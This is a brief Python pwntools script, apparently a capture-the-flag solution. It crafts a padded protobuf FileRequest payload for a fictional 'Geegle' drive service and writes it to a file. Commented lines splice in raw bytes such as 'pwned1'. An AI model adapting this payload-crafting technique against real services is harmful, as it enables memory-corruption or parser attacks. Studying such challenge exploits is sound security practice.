from pwn import *
import test_pb2

KEY_SIZE = 64

a = test_pb2.FileRequest()
a.filename = "/user=test/s=1/test.txt"
a.timestamp = 1
a.log_info ="[drive@services.geegle.org] test is accessing this file (X-Geegle-Debug: )."
#a.trace_id = 1
#a.trace_id=36170086419038233

x = a.SerializeToString() #+"\x0a\x03\x00\x00\x00\x0a\x03"#+ "\x80\x19\x80\x80\x80\x80\x80\x80\x00" + "\x0a\x03abc"
y = u64("\xb8\x17\x00\x15\x00\x00\x00\x00")/8
l = len(x)
print(x)
a.log_info = "[drive@services.geegle.org] test is accessing this file (X-Geegle-Debug: " + "A"*(y-l-KEY_SIZE-3) + ")."
x = "B"*KEY_SIZE + a.SerializeToString() # + "\x80" + "\xb8\x17\x00\x15\x00\x00\x00\x00" + "\x1a\x06pwned1" + "\x0a\x06pwned2"
#print(len(x))

#print(y)

f = open("a", "wb")
f.write(x)
f.close()

#l = len(x)
#print l
